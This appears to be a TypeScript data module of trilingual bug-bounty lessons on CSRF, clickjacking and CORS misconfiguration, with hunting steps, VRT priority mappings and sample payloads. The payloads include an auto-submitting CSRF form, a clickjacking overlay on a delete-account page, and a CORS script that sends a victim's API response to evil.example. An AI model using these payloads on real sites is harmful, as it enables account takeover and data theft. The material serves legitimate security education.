import type { LearnGroup } from "@/learn/data/types";

// CSRF & CORS — advanced, P3/P4-focused learn content.
// VRT backbone: Bugcrowd Vulnerability Rating Taxonomy release 2026-07-08.
// CSRF and clickjacking are forced-action bugs; CORS is a cross-origin READ bug
// (VRT leaf "Unsafe Cross-Origin Resource Sharing", priority set by impact).

export const csrfCorsGroup: LearnGroup = {
  id: "csrf-cors",
  name: "CSRF & CORS",
  emoji: "🎣",
  blurb:
    "Making a logged-in victim's browser act (CSRF, clickjacking) or read across origins (CORS) without their intent. In the SameSite era the win is finding the action or endpoint where the browser's defaults don't save the app.",
  topics: [
    {
      id: "csrf",
      name: "Cross-Site Request Forgery (CSRF)",
      emoji: "🎣",
      intro: {
        en: "A state-changing request authenticated only by an ambient cookie, with no unpredictable token actually validated, can be forged from any origin the victim visits. The 2025 reality is SameSite: Chromium defaults cookies to `Lax`, which kills the naive cross-site POST — so classic blanket CSRF is mostly dead, and the live findings sit in the gaps. Lead at the action-specific nuance: a GET that changes state, a cookie explicitly set `SameSite=None`, the ~2-minute Lax+POST top-level-navigation window, a double-submit token that's settable from a sibling subdomain, or a JSON endpoint that still accepts `text/plain`. Standalone action CSRF varies in band; chain it to an account-controlling action (email/password change) and it escalates to application-wide P2.",
        simple: "A request that changes state but is authenticated only by a cookie — with no unpredictable token actually checked — can be forged from any site the victim visits. The 2025 reality is SameSite: Chromium defaults cookies to `Lax`, which kills the naive cross-site POST, so classic blanket CSRF is mostly dead and the live bugs sit in the gaps. Look for the action-specific cases: a GET that changes state, a cookie explicitly set `SameSite=None`, the ~2-minute Lax+POST top-level-navigation window, a double-submit token you can set from a sibling subdomain, or a JSON endpoint that still accepts `text/plain`. Standalone action CSRF varies in band; chain it to an account-controlling action (email/password change) and it rises to application-wide P2.",
        hi: "एक state बदलने वाली request जो सिर्फ़ एक ambient cookie से authenticate होती है, और जिसमें कोई unpredictable token सच में validate नहीं होता, victim जिस भी origin पर जाए वहाँ से forge की जा सकती है। 2025 की हक़ीक़त है SameSite: Chromium cookies को default में `Lax` रखता है, जो सीधे cross-site POST को ख़त्म कर देता है — तो पुराना blanket CSRF काफ़ी हद तक मर चुका है, और असली findings gaps में हैं। action-specific बारीकियों पर ध्यान दें: एक GET जो state बदले, एक cookie जो जानबूझकर `SameSite=None` हो, ~2-minute वाला Lax+POST top-level-navigation window, एक double-submit token जो sibling subdomain से set हो सके, या एक JSON endpoint जो अब भी `text/plain` accept करे। अकेला action CSRF band में बदलता रहता है; इसे किसी account-controlling action (email/password change) से chain करें तो यह application-wide P2 तक escalate हो जाता है।",
      },
      howToFind: [
        {
          title: {
            en: "Probe how the token is actually validated",
            simple: "Probe how the token is really checked",
            hi: "जाँचें कि token असल में कैसे validate होता है",
          },
          steps: [
            {
              en: "Capture a sensitive state-change (change email, add recipient, disable 2FA) and strip the CSRF token — if it still succeeds the token is decorative.",
              simple: "Capture a sensitive state-change (change email, add recipient, disable 2FA) and remove the CSRF token — if it still works, the token is just for show.",
              hi: "एक sensitive state-change capture करें (change email, add recipient, disable 2FA) और CSRF token हटा दें — अगर फिर भी काम कर जाए तो token सिर्फ़ दिखावे का है।",
            },
            {
              en: "Swap in another user's token, send an empty token, and replay a stale one: any acceptance means the token isn't bound per-session/per-request (VRT flags 'token not unique per request' as its own P5).",
              simple: "Try another user's token, an empty token, and an old token: if any is accepted, the token isn't tied to the session/request (VRT lists 'token not unique per request' as its own P5).",
              hi: "किसी दूसरे user का token डालें, खाली token भेजें, और एक पुराना token दोबारा भेजें: कोई भी accept होना मतलब token per-session/per-request bound नहीं है (VRT 'token not unique per request' को अपने आप में P5 मानता है)।",
            },
            {
              en: "Downgrade the method (POST→GET) and flip `Content-Type` (`application/json` → `text/plain` or `application/x-www-form-urlencoded`) to dodge both the token check and the CORS preflight — many frameworks only enforce the token on the 'expected' verb/type.",
              simple: "Downgrade the method (POST→GET) and change the `Content-Type` (`application/json` → `text/plain` or `application/x-www-form-urlencoded`) to dodge both the token check and the CORS preflight — many frameworks only enforce the token on the 'expected' verb/type.",
              hi: "method downgrade करें (POST→GET) और `Content-Type` बदलें (`application/json` → `text/plain` या `application/x-www-form-urlencoded`) ताकि token check और CORS preflight दोनों से बचा जा सके — कई frameworks token सिर्फ़ 'expected' verb/type पर ही enforce करते हैं।",
            },
          ],
        },
        {
          title: {
            en: "Work the SameSite reality of 2025",
            simple: "Work around SameSite in 2025",
            hi: "2025 की SameSite हक़ीक़त के साथ काम करें",
          },
          steps: [
            {
              en: "Read the session cookie's `SameSite`: `None` re-opens full cross-site CSRF; `Lax` still permits top-level-navigation GETs and (within ~2 minutes of being set) POSTs via form auto-submit.",
              simple: "Read the session cookie's `SameSite`: `None` re-opens full cross-site CSRF; `Lax` still allows top-level-navigation GETs and (within ~2 minutes of being set) POSTs via auto-submitting forms.",
              hi: "session cookie का `SameSite` देखें: `None` पूरा cross-site CSRF दोबारा खोल देता है; `Lax` फिर भी top-level-navigation GETs और (set होने के ~2 मिनट के अंदर) form auto-submit वाले POSTs allow करता है।",
            },
            {
              en: "Hunt GET-based state changes (`/account/email?new=...`) — `Lax` sends the cookie on a top-level GET, so an auto-navigating link forges the action with no token in play.",
              simple: "Hunt GET-based state changes (`/account/email?new=...`) — `Lax` sends the cookie on a top-level GET, so an auto-navigating link forges the action with no token involved.",
              hi: "GET-based state changes ढूँढें (`/account/email?new=...`) — `Lax` top-level GET पर cookie भेज देता है, तो एक auto-navigate करने वाला link बिना किसी token के action forge कर देता है।",
            },
            {
              en: "Check whether a sibling subdomain, an open redirect, or a cached response lets you plant/leak the token or satisfy a referer check — a subdomain you influence often defeats `SameSite`/double-submit assumptions.",
              simple: "Check whether a sibling subdomain, an open redirect, or a cached response lets you plant/leak the token or pass a referer check — a subdomain you control often beats `SameSite`/double-submit assumptions.",
              hi: "देखें कि कोई sibling subdomain, open redirect, या cached response आपको token plant/leak करने या referer check pass करने देता है या नहीं — आपके control वाला subdomain अक्सर `SameSite`/double-submit की धारणाओं को हरा देता है।",
            },
          ],
        },
        {
          title: {
            en: "Prove it minimally and target impact",
            simple: "Prove it with the least change and aim at impact",
            hi: "सबसे कम बदलाव से साबित करें और impact पर निशाना लगाएँ",
          },
          steps: [
            {
              en: "Host an off-domain auto-submitting form (or a `fetch(..., {credentials:'include'})` for simple-request endpoints) and show the action firing in the victim session — a benign, reversible change is enough proof.",
              simple: "Host an off-domain auto-submitting form (or a `fetch(..., {credentials:'include'})` for simple-request endpoints) and show the action firing in the victim session — a safe, reversible change is enough proof.",
              hi: "एक off-domain auto-submitting form host करें (या simple-request endpoints के लिए `fetch(..., {credentials:'include'})`) और दिखाएँ कि action victim की session में चल रहा है — एक benign, reversible बदलाव काफ़ी सबूत है।",
            },
            {
              en: "Aim the PoC at an account-controlling action so the writeup carries the chain (email change → reset → ATO), which is what lifts it from action-specific to application-wide P2.",
              simple: "Aim the PoC at an account-controlling action so the report shows the chain (email change → reset → ATO) — that is what lifts it from action-specific to application-wide P2.",
              hi: "PoC को किसी account-controlling action पर लक्ष्य करें ताकि writeup में chain दिखे (email change → reset → ATO), यही इसे action-specific से application-wide P2 तक ले जाता है।",
            },
          ],
        },
      ],
      payloads: [
        "<form action=\"https://target.example/api/account/email\" method=\"POST\"><input name=\"email\" value=\"attacker@evil.example\"></form><script>document.forms[0].submit()</script>",
        "fetch('https://target.example/api/transfer', {method:'POST', credentials:'include', headers:{'Content-Type':'text/plain'}, body:'{\"to\":\"attacker\",\"amount\":1}'})   (JSON CSRF via text/plain, no preflight)",
        "GET https://target.example/account/email?new=attacker@evil.example   (SameSite=Lax top-level navigation)",
        "Replay the request with the X-CSRF-Token header removed, then with another account's token",
      ],
      example: {
        en: "A 'change email' endpoint accepted a POST with no CSRF token and its session cookie was set `SameSite=None` for a third-party embed. An auto-submitting form on an attacker page changed the victim's email, after which the standard password-reset gave full account takeover — forged across the whole authenticated surface, triaged application-wide P2 (CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L). The same bug on a cosmetic, non-account action would have been scored action-specific instead.",
        simple: "A 'change email' endpoint accepted a POST with no CSRF token, and its session cookie was set `SameSite=None` for a third-party embed. An auto-submitting form on an attacker page changed the victim's email, and the normal password-reset then gave full account takeover — forged across the whole authenticated surface, triaged application-wide P2 (CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L). The same bug on a cosmetic, non-account action would have been scored action-specific instead.",
        hi: "एक 'change email' endpoint बिना CSRF token के POST accept करता था और उसकी session cookie एक third-party embed के लिए `SameSite=None` set थी। attacker के page पर एक auto-submitting form ने victim का email बदल दिया, जिसके बाद सामान्य password-reset ने पूरा account takeover दे दिया — पूरे authenticated surface पर forge हुआ, application-wide P2 triage हुआ (CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L)। वही bug किसी cosmetic, non-account action पर होता तो action-specific score होता।",
      },
      mapping: {
        bugcrowdVrt: "Cross-Site Request Forgery (CSRF) › Action-Specific › Authenticated Action",
        bugcrowdPriority: "varies",
        hackeroneCwe: "CWE-352: Cross-Site Request Forgery (CSRF)",
        cvssSeverity: "Depends on the action (Medium → High)",
        note: {
          en: "Bugcrowd VRT: Application-Wide CSRF P2 (CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L); Action-Specific › Authenticated Action varies with the action; Logout CSRF P5; 'CSRF Token Not Unique Per Request' P5. Reaching an account-controlling action escalates it to application-wide P2.",
          simple: "Bugcrowd VRT: Application-Wide CSRF P2 (CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L); Action-Specific › Authenticated Action varies with the action; Logout CSRF P5; 'CSRF Token Not Unique Per Request' P5. Reaching an account-controlling action lifts it to application-wide P2.",
          hi: "Bugcrowd VRT: Application-Wide CSRF P2 (CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L); Action-Specific › Authenticated Action action के हिसाब से बदलता है; Logout CSRF P5; 'CSRF Token Not Unique Per Request' P5. किसी account-controlling action तक पहुँचना इसे application-wide P2 तक escalate कर देता है।",
        },
      },
      checklistCategoryId: "req-csrf",
    },
    {
      id: "clickjacking",
      name: "Clickjacking (UI Redressing)",
      emoji: "🖱️",
      intro: {
        en: "The sensitive page is framed by an attacker and overlaid so the victim's click lands on a hidden control instead of what they think they're pressing. The bar is a missing `X-Frame-Options`/`Content-Security-Policy: frame-ancestors` on an endpoint with a one-click security-relevant action — that's the P4 'Sensitive Click-Based Action'. Two 2025 nuances raise the ceiling: third-party iframes don't carry `SameSite=Lax/Strict` cookies, so framing only bites where the action rides a `SameSite=None` session or first-party context; and 'double-clickjacking' (window-swap timed to a double-click) can land a click on a protected page even when `frame-ancestors`/XFO would block a classic frame. Lead at the P4 single-action case; form-fill and non-sensitive variants are P5.",
        simple: "The attacker frames the sensitive page and overlays it so the victim's click lands on a hidden control instead of what they meant to press. The bar is a missing `X-Frame-Options`/`Content-Security-Policy: frame-ancestors` on an endpoint with a one-click security-relevant action — that's the P4 'Sensitive Click-Based Action'. Two 2025 points raise the ceiling: third-party iframes don't carry `SameSite=Lax/Strict` cookies, so framing only works where the action rides a `SameSite=None` session or first-party context; and 'double-clickjacking' (a window swap timed to a double-click) can land a click on a protected page even when `frame-ancestors`/XFO would block a normal frame. Focus on the P4 single-action case; form-fill and non-sensitive variants are P5.",
        hi: "attacker sensitive page को frame करके ऐसे overlay करता है कि victim का click उस छुपे control पर पड़े जिसे वो दबाना नहीं चाहता था। बार है किसी one-click security-relevant action वाले endpoint पर `X-Frame-Options`/`Content-Security-Policy: frame-ancestors` का न होना — यही P4 'Sensitive Click-Based Action' है। 2025 की दो बातें छत ऊँची करती हैं: third-party iframes `SameSite=Lax/Strict` cookies नहीं ले जाते, तो framing सिर्फ़ वहीं चलता है जहाँ action किसी `SameSite=None` session या first-party context पर हो; और 'double-clickjacking' (double-click के समय window-swap) एक protected page पर भी click पहुँचा सकता है, तब भी जब `frame-ancestors`/XFO classic frame को block कर देते। P4 single-action case पर ध्यान दें; form-fill और non-sensitive variants P5 हैं।",
      },
      howToFind: [
        {
          title: {
            en: "Confirm the page is framable and build the overlay",
            simple: "Confirm the page can be framed and build the overlay",
            hi: "पक्का करें कि page frame हो सकता है और overlay बनाएँ",
          },
          steps: [
            {
              en: "Request the sensitive page and check response headers for `X-Frame-Options` and a CSP `frame-ancestors` directive — absence (or a `frame-ancestors` that allows `*`/your origin) means it frames.",
              simple: "Request the sensitive page and check the response headers for `X-Frame-Options` and a CSP `frame-ancestors` directive — if they're absent (or `frame-ancestors` allows `*`/your origin), it can be framed.",
              hi: "sensitive page request करें और response headers में `X-Frame-Options` और CSP `frame-ancestors` directive देखें — इनका न होना (या ऐसा `frame-ancestors` जो `*`/आपका origin allow करे) मतलब यह frame हो सकता है।",
            },
            {
              en: "Prove it with a PoC that loads the target in an `<iframe>` at low opacity, positioned so a decoy button sits exactly over the real sensitive control.",
              simple: "Prove it with a PoC that loads the target in a low-opacity `<iframe>`, positioned so a decoy button sits exactly over the real sensitive control.",
              hi: "एक PoC से साबित करें जो target को low opacity वाले `<iframe>` में load करे, इस तरह रखा हो कि एक decoy button असली sensitive control के ठीक ऊपर बैठे।",
            },
            {
              en: "Verify the action's auth survives framing: if it depends on a `SameSite=Lax/Strict` cookie it won't fire cross-site, so confirm either a `SameSite=None` session or a flow that keeps first-party context.",
              simple: "Verify the action's auth survives framing: if it relies on a `SameSite=Lax/Strict` cookie it won't fire cross-site, so confirm either a `SameSite=None` session or a flow that keeps first-party context.",
              hi: "पक्का करें कि action की auth framing में टिकती है: अगर यह किसी `SameSite=Lax/Strict` cookie पर निर्भर है तो cross-site नहीं चलेगी, इसलिए या तो `SameSite=None` session confirm करें या ऐसा flow जो first-party context बनाए रखे।",
            },
          ],
        },
        {
          title: {
            en: "Reach for double-clickjacking when framing is blocked (2025)",
            simple: "Try double-clickjacking when framing is blocked (2025)",
            hi: "जब framing block हो तो double-clickjacking आज़माएँ (2025)",
          },
          steps: [
            {
              en: "When XFO/`frame-ancestors` prevents an iframe, test the window-swap technique: a lure page opens the target in a new window and uses the gap between `mousedown` and the second click of a double-click to swap focus so the second click lands on the authorize/confirm control.",
              simple: "When XFO/`frame-ancestors` blocks an iframe, test the window-swap technique: a lure page opens the target in a new window and uses the gap between `mousedown` and the second click of a double-click to swap focus so the second click lands on the authorize/confirm control.",
              hi: "जब XFO/`frame-ancestors` iframe को रोक दे, तो window-swap technique test करें: एक lure page target को नई window में खोलता है और double-click के `mousedown` तथा दूसरे click के बीच के gap का इस्तेमाल करके focus swap कर देता है ताकि दूसरा click authorize/confirm control पर पड़े।",
            },
            {
              en: "This sidesteps anti-framing headers and SameSite because the action happens in a top-level window — demonstrate it only against a benign, reversible action.",
              simple: "This gets around anti-framing headers and SameSite because the action happens in a top-level window — demonstrate it only on a safe, reversible action.",
              hi: "यह anti-framing headers और SameSite से बच निकलता है क्योंकि action एक top-level window में होता है — इसे सिर्फ़ किसी benign, reversible action पर दिखाएँ।",
            },
          ],
        },
        {
          title: {
            en: "Classify the action to set the band",
            simple: "Classify the action to set the band",
            hi: "band तय करने के लिए action को classify करें",
          },
          steps: [
            {
              en: "A single hidden click that triggers a security-relevant change (delete account, authorize an OAuth app, change a setting) is the P4 Sensitive Click-Based Action.",
              simple: "A single hidden click that triggers a security-relevant change (delete account, authorize an OAuth app, change a setting) is the P4 Sensitive Click-Based Action.",
              hi: "एक अकेला छुपा click जो कोई security-relevant बदलाव करे (delete account, किसी OAuth app को authorize, कोई setting बदलना) ही P4 Sensitive Click-Based Action है।",
            },
            {
              en: "Multi-step form input you can force (fill-and-submit) is Form Input P5; framing a non-sensitive action is P5 — report the honest variant rather than overstating.",
              simple: "Multi-step form input you can force (fill-and-submit) is Form Input P5; framing a non-sensitive action is P5 — report the honest variant instead of overstating.",
              hi: "ऐसा multi-step form input जो आप ज़बरदस्ती करा सकें (fill-and-submit) वह Form Input P5 है; किसी non-sensitive action को frame करना P5 है — बढ़ा-चढ़ाकर कहने के बजाय ईमानदार variant रिपोर्ट करें।",
            },
          ],
        },
      ],
      payloads: [
        "<style>iframe{position:absolute;opacity:0.0001;top:0;left:0;width:1000px;height:800px;z-index:2}#decoy{position:absolute;top:320px;left:260px;z-index:1}</style><div id=\"decoy\">Click to win</div><iframe src=\"https://target.example/settings/delete-account\"></iframe>",
        "Double-clickjacking skeleton: window.open('https://target.example/oauth/authorize?...'); then time a swap so the victim's second click lands on 'Authorize'",
      ],
      example: {
        en: "The 'authorize third-party app' confirmation on an OAuth consent screen shipped with no `X-Frame-Options` and no `frame-ancestors`, and the session cookie was `SameSite=None`. An overlay framed the page with a transparent 'Authorize' button under a game decoy; a single tricked click granted the attacker's app access to the victim account — a sensitive one-click action, triaged P4 (CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N) and worth more in the writeup as the first hop of an OAuth-grant chain.",
        simple: "The 'authorize third-party app' confirmation on an OAuth consent screen shipped with no `X-Frame-Options` and no `frame-ancestors`, and the session cookie was `SameSite=None`. An overlay framed the page with a transparent 'Authorize' button under a game decoy; a single tricked click gave the attacker's app access to the victim account — a sensitive one-click action, triaged P4 (CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N) and worth more in the report as the first hop of an OAuth-grant chain.",
        hi: "एक OAuth consent screen पर 'authorize third-party app' की confirmation बिना `X-Frame-Options` और बिना `frame-ancestors` के आई, और session cookie `SameSite=None` थी। एक overlay ने page को frame किया, एक game decoy के नीचे पारदर्शी 'Authorize' button रखा; एक धोखे वाले click ने attacker की app को victim के account का access दे दिया — एक sensitive one-click action, P4 triage हुआ (CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N) और writeup में एक OAuth-grant chain के पहले hop के तौर पर ज़्यादा क़ीमती।",
      },
      mapping: {
        bugcrowdVrt: "Server Security Misconfiguration › Clickjacking › Sensitive Click-Based Action",
        bugcrowdPriority: "P4",
        bugcrowdCvss: "AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
        hackeroneCwe: "CWE-1021: Improper Restriction of Rendered UI Layers or Frames (UI Redressing)",
        cvssSeverity: "Low",
        note: {
          en: "Bugcrowd VRT: Sensitive Click-Based Action P4 (CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N); Form Input P5; Non-Sensitive Action P5.",
          simple: "Bugcrowd VRT: Sensitive Click-Based Action P4 (CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N); Form Input P5; Non-Sensitive Action P5.",
          hi: "Bugcrowd VRT: Sensitive Click-Based Action P4 (CVSS AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N); Form Input P5; Non-Sensitive Action P5.",
        },
      },
      checklistCategoryId: "req-clickjacking",
    },
    {
      id: "cors",
      name: "CORS Misconfiguration",
      emoji: "🌐",
      intro: {
        en: "CORS is a cross-origin READ bug: when the server reflects the request `Origin` into `Access-Control-Allow-Origin` and pairs it with `Access-Control-Allow-Credentials: true` on an endpoint that returns the victim's authenticated data, any attacker page can fetch that response with the victim's cookies and read it. The subtle findability is in the trust-boundary logic — reflected arbitrary origin, trusted `null`, and sloppy prefix/suffix/regex matching (`target.com.evil.com`, `eviltarget.com`, scheme downgrade). Bugcrowd's VRT files it under Server Security Misconfiguration › Unsafe Cross-Origin Resource Sharing, a leaf with no fixed priority ('varies'): triage sets the band from what the read enables, so the payout is set by the sensitivity of what you can read, not by CORS itself.",
        simple: "CORS is a cross-origin READ bug: when the server reflects the request `Origin` into `Access-Control-Allow-Origin` and also sends `Access-Control-Allow-Credentials: true` on an endpoint that returns the victim's authenticated data, any attacker page can fetch that response with the victim's cookies and read it. The skill is in the trust-boundary logic — reflected arbitrary origin, trusted `null`, and sloppy prefix/suffix/regex matching (`target.com.evil.com`, `eviltarget.com`, scheme downgrade). Bugcrowd's VRT files it under Server Security Misconfiguration › Unsafe Cross-Origin Resource Sharing, a leaf with no fixed priority ('varies'): triage sets the band from what the read enables, so the payout depends on how sensitive the data you can read is, not on CORS itself.",
        hi: "CORS एक cross-origin READ bug है: जब server request के `Origin` को `Access-Control-Allow-Origin` में reflect करता है और किसी ऐसे endpoint पर जो victim का authenticated data लौटाता है उसके साथ `Access-Control-Allow-Credentials: true` भी भेजता है, तो कोई भी attacker page उस response को victim की cookies के साथ fetch करके पढ़ सकता है। असली बारीकी trust-boundary logic में है — reflected arbitrary origin, trusted `null`, और ढीली prefix/suffix/regex matching (`target.com.evil.com`, `eviltarget.com`, scheme downgrade)। Bugcrowd का VRT इसे Server Security Misconfiguration › Unsafe Cross-Origin Resource Sharing के नीचे रखता है, एक ऐसा leaf जिसकी कोई fixed priority नहीं ('varies'): triage band इस बात से तय करता है कि read से क्या हासिल होता है, तो payout इस पर निर्भर है कि आप जो पढ़ सकते हैं वो कितना sensitive है, न कि CORS पर।",
      },
      howToFind: [
        {
          title: {
            en: "Probe how Origin is reflected",
            simple: "Probe how Origin is reflected",
            hi: "जाँचें कि Origin कैसे reflect होता है",
          },
          steps: [
            {
              en: "Send `Origin: https://evil.example` to authenticated data endpoints (`/api/me`, `/api/account`, token/key endpoints) and inspect the response for `Access-Control-Allow-Origin: https://evil.example` together with `Access-Control-Allow-Credentials: true` — that pair is the finding.",
              simple: "Send `Origin: https://evil.example` to authenticated data endpoints (`/api/me`, `/api/account`, token/key endpoints) and check the response for `Access-Control-Allow-Origin: https://evil.example` together with `Access-Control-Allow-Credentials: true` — that pair is the finding.",
              hi: "authenticated data endpoints (`/api/me`, `/api/account`, token/key endpoints) पर `Origin: https://evil.example` भेजें और response में `Access-Control-Allow-Origin: https://evil.example` के साथ `Access-Control-Allow-Credentials: true` देखें — यही जोड़ी finding है।",
            },
            {
              en: "Test `Origin: null` (reachable from a sandboxed iframe or `data:`/`file:` context) and watch for `Access-Control-Allow-Origin: null` with credentials allowed.",
              simple: "Test `Origin: null` (reachable from a sandboxed iframe or a `data:`/`file:` context) and watch for `Access-Control-Allow-Origin: null` with credentials allowed.",
              hi: "`Origin: null` test करें (जो sandboxed iframe या `data:`/`file:` context से मिल सकता है) और देखें कि `Access-Control-Allow-Origin: null` credentials के साथ allow होता है या नहीं।",
            },
            {
              en: "Try scheme/port downgrade (`http://` of an https site) and malformed origins to see whether the allow-logic is doing a loose comparison.",
              simple: "Try scheme/port downgrade (`http://` of an https site) and malformed origins to see whether the allow-logic does a loose comparison.",
              hi: "scheme/port downgrade (किसी https site का `http://`) और malformed origins आज़माएँ ताकि देखा जा सके कि allow-logic ढीली comparison तो नहीं कर रही।",
            },
          ],
        },
        {
          title: {
            en: "Break the allowlist regex / matching logic",
            simple: "Break the allowlist regex / matching logic",
            hi: "allowlist regex / matching logic तोड़ें",
          },
          steps: [
            {
              en: "Suffix match: `https://target.com.evil.example` — passes a check that only asks 'does it end in target.com?' when the dot isn't anchored.",
              simple: "Suffix match: `https://target.com.evil.example` — passes a check that only asks 'does it end in target.com?' when the dot isn't anchored.",
              hi: "Suffix match: `https://target.com.evil.example` — ऐसे check को pass कर जाता है जो सिर्फ़ पूछता है 'क्या यह target.com पर ख़त्म होता है?' जब dot anchor नहीं है।",
            },
            {
              en: "Prefix/substring match: `https://evil-target.com` or `https://targetxcom.evil.example` to beat naive `startsWith`/`contains` checks; also unescaped-dot regexes where `.` matches any char.",
              simple: "Prefix/substring match: `https://evil-target.com` or `https://targetxcom.evil.example` to beat naive `startsWith`/`contains` checks; also unescaped-dot regexes where `.` matches any character.",
              hi: "Prefix/substring match: naive `startsWith`/`contains` checks हराने के लिए `https://evil-target.com` या `https://targetxcom.evil.example`; साथ ही unescaped-dot regexes जहाँ `.` किसी भी character से match हो जाए।",
            },
            {
              en: "If only subdomains are trusted, pivot: an XSS or subdomain takeover on a trusted `*.target.com` origin gives you a whitelisted origin to fetch from.",
              simple: "If only subdomains are trusted, pivot: an XSS or subdomain takeover on a trusted `*.target.com` origin gives you a whitelisted origin to fetch from.",
              hi: "अगर सिर्फ़ subdomains पर भरोसा हो, तो pivot करें: किसी trusted `*.target.com` origin पर XSS या subdomain takeover आपको fetch करने के लिए एक whitelisted origin दे देता है।",
            },
          ],
        },
        {
          title: {
            en: "Prove the credentialed read safely",
            simple: "Prove the credentialed read safely",
            hi: "credentialed read को सुरक्षित तरीक़े से साबित करें",
          },
          steps: [
            {
              en: "From an attacker-controlled page, `fetch(victimEndpoint, {credentials:'include'})` and read a benign marker from the response (the victim's own email or a non-secret field) to demonstrate cross-origin exfiltration — don't harvest at scale.",
              simple: "From an attacker-controlled page, run `fetch(victimEndpoint, {credentials:'include'})` and read a harmless marker from the response (the victim's own email or a non-secret field) to show cross-origin exfiltration — don't harvest at scale.",
              hi: "attacker के control वाले page से `fetch(victimEndpoint, {credentials:'include'})` चलाएँ और response से एक benign marker पढ़ें (victim का अपना email या कोई non-secret field) ताकि cross-origin exfiltration दिखाई जा सके — बड़े पैमाने पर data इकट्ठा न करें।",
            },
            {
              en: "Document that it requires `Allow-Credentials: true` plus a reflected/over-broad origin and returns private data; without credentials or without sensitive data in the body, it's typically not rewardable.",
              simple: "Note that it needs `Allow-Credentials: true` plus a reflected/over-broad origin and returns private data; without credentials or without sensitive data in the body, it's usually not rewardable.",
              hi: "यह लिखें कि इसके लिए `Allow-Credentials: true` के साथ एक reflected/over-broad origin चाहिए और यह private data लौटाता है; credentials के बिना या body में sensitive data के बिना यह आम तौर पर rewardable नहीं है।",
            },
          ],
        },
      ],
      payloads: [
        "curl -s -I https://target.example/api/me -H \"Origin: https://evil.example\"   (look for ACAO reflected + ACAC: true)",
        "curl -s -I https://target.example/api/me -H \"Origin: null\"",
        "Origin: https://target.example.evil.example   and   Origin: https://eviltarget.example   (suffix/prefix bypass)",
        "<script>fetch('https://target.example/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://evil.example/log?d='+encodeURIComponent(d)))</script>",
      ],
      example: {
        en: "`GET /api/account` reflected whatever `Origin` was sent into `Access-Control-Allow-Origin` and returned `Access-Control-Allow-Credentials: true`, while the body contained the user's email, API token, and CSRF token. An attacker page read the whole response cross-origin with the victim's cookies; the leaked API token then enabled account takeover. Because the VRT's 'Unsafe Cross-Origin Resource Sharing' leaf has no fixed priority, triage scored it on the sensitivity of the exfiltrated data — the leaked API token is what pushed it up.",
        simple: "`GET /api/account` reflected whatever `Origin` was sent into `Access-Control-Allow-Origin` and returned `Access-Control-Allow-Credentials: true`, while the body held the user's email, API token, and CSRF token. An attacker page read the whole response cross-origin with the victim's cookies; the leaked API token then enabled account takeover. Because the VRT's 'Unsafe Cross-Origin Resource Sharing' leaf has no fixed priority, triage scored it on how sensitive the exfiltrated data was — the leaked API token is what pushed it up.",
        hi: "`GET /api/account` जो भी `Origin` भेजा जाता उसे `Access-Control-Allow-Origin` में reflect करता और `Access-Control-Allow-Credentials: true` लौटाता, जबकि body में user का email, API token, और CSRF token थे। एक attacker page ने पूरी response को victim की cookies के साथ cross-origin पढ़ लिया; फिर leak हुए API token ने account takeover करा दिया। चूँकि VRT का 'Unsafe Cross-Origin Resource Sharing' leaf कोई fixed priority नहीं रखता, triage ने इसे exfiltrate हुए data की sensitivity पर score किया — leak हुआ API token ही इसे ऊपर ले गया।",
      },
      mapping: {
        bugcrowdVrt: "Server Security Misconfiguration › Unsafe Cross-Origin Resource Sharing",
        bugcrowdPriority: "varies",
        hackeroneCwe: "CWE-942: Permissive Cross-domain Policy with Untrusted Domains",
        cvssSeverity: "Depends on impact (what the misconfiguration lets an attacker read)",
        note: {
          en: "VRT leaf: Server Security Misconfiguration › Unsafe Cross-Origin Resource Sharing, priority 'varies' (CWE-942 in Bugcrowd's CWE mapping) — triaged by the impact it enables. What makes it pay is a reflected (or over-broad) Origin plus Access-Control-Allow-Credentials: true on an endpoint that returns sensitive authenticated data, giving a credentialed cross-origin read; without credentials or sensitive data it's usually not rewardable.",
          simple: "VRT leaf: Server Security Misconfiguration › Unsafe Cross-Origin Resource Sharing, priority 'varies' (CWE-942 in Bugcrowd's CWE mapping) — triaged by the impact it enables. What makes it pay is a reflected (or over-broad) Origin plus Access-Control-Allow-Credentials: true on an endpoint that returns sensitive authenticated data, giving a credentialed cross-origin read; without credentials or sensitive data it's usually not rewardable.",
          hi: "VRT leaf: Server Security Misconfiguration › Unsafe Cross-Origin Resource Sharing, priority 'varies' (Bugcrowd की CWE mapping में CWE-942) — यह जो impact देता है उसके हिसाब से triage होता है। इसे पैसा दिलाने वाली बात है एक reflected (या over-broad) Origin के साथ Access-Control-Allow-Credentials: true किसी ऐसे endpoint पर जो sensitive authenticated data लौटाए, जिससे एक credentialed cross-origin read मिले; credentials या sensitive data के बिना यह आम तौर पर rewardable नहीं।",
        },
      },
      checklistCategoryId: "req-cors",
    },
  ],
};
